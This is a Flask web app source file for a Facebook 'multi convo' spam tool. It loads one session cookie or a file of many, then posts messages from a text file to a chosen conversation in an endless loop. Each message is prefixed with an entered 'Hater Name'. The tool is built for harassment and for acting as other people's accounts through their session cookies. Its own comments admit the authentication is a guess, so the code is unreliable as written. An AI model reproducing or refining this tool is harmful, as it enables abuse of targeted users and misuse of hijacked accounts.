from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import re

app = Flask(__name__)
app.debug = True

# Headers for the request
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

# Function to parse cookie string into a dictionary
def parse_cookie_string(cookie_string):
    cookies = {}
    for item in cookie_string.split(';'):
        if '=' in item:
            key, value = item.split('=', 1)
            cookies[key.strip()] = value.strip()
    return cookies

# The main function to send messages, now using cookies
def send_messages(cookie_strings, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    
    # Use the first cookie string to extract the c_user ID for the API call
    # This is a common pattern for Facebook API calls with cookies
    first_cookie_dict = parse_cookie_string(cookie_strings[0])
    c_user = first_cookie_dict.get('c_user')
    
    if not c_user:
        print("Error: 'c_user' not found in the cookie string. Cannot proceed.")
        return

    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for cookie_string in cookie_strings:
                # Parse the cookie string for the requests library
                cookies = parse_cookie_string(cookie_string)
                
                # The API endpoint for sending messages using cookies
                # Note: This is a simplified example. Real-world cookie-based API calls often require more complex data and headers (like dtsg, etc.)
                # We are using the graph API endpoint and hoping the cookies are sufficient for authentication.
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                
                # The parameters are simplified for a cookie-based request.
                # The actual authentication is expected to be handled by the 'cookies' parameter.
                parameters = {'message': message}
                
                # We need to send a POST request to the message endpoint.
                # The cookies are passed directly to the requests library.
                response = requests.post(
                    api_url, 
                    data=parameters, 
                    headers=headers, 
                    cookies=cookies
                )
                
                if response.status_code == 200:
                    print(f"Message Sent Successfully (Cookie User {c_user}): {message}")
                else:
                    print(f"Message Sent Failed (Cookie User {c_user}): {message}. Response: {response.text}")
                
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        cookie_option = request.form.get('cookieOption')
        
        if cookie_option == 'single':
            cookie_strings = [request.form.get('singleCookie')]
        else:
            cookie_file = request.files['cookieFile']
            cookie_strings = cookie_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        # Renamed access_tokens to cookie_strings in args
        thread = Thread(target=send_messages, args=(cookie_strings, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Muddassir MULTI CONVO (Cookie)</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */
    label { color: white; }
    .file { height: 30px; }
    body {
      background-image: url('https://i.ibb.co/Y7pSw8n/0619bf4938a774e6cb5f4eea1ce28559.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
    }
    .container {
      max-width: 350px;
      height: auto;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      box-shadow: 0 0 15px white;
      border: none;
      resize: none;
    }
    .form-control {
      outline: 1px red;
      border: 1px double white;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
      color: none;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">(Muddassir-X)</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="cookieOption" class="form-label">Select Cookie Option</label>
        <select class="form-control" id="cookieOption" name="cookieOption" onchange="toggleCookieInput()" required>
          <option value="single">Single Cookie</option>
          <option value="multiple">Cookie File</option>
        </select>
      </div>
      <div class="mb-3" id="singleCookieInput">
        <label for="singleCookie" class="form-label">Enter Single Cookie String</label>
        <input type="text" class="form-control" id="singleCookie" name="singleCookie">
      </div>
      <div class="mb-3" id="cookieFileInput" style="display: none;">
        <label for="cookieFile" class="form-label">Choose Cookie File</label>
        <input type="file" class="form-control" id="cookieFile" name="cookieFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Enter Your Hater Name</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Enter Time (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Choose Your Np File</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Run</button>
    </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
    </form>
  </div>
  <footer class="footer">
    <p>© 2025 Coded By :- Muddassir</p>
    <p> ALWAYS ON FIRE 🔥 <a href="">Muddassir</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+923243037456" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  <script>
    function toggleCookieInput() {
      var cookieOption = document.getElementById('cookieOption').value;
      if (cookieOption == 'single') {
        document.getElementById('singleCookieInput').style.display = 'block';
        document.getElementById('cookieFileInput').style.display = 'none';
      } else {
        document.getElementById('singleCookieInput').style.display = 'none';
        document.getElementById('cookieFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
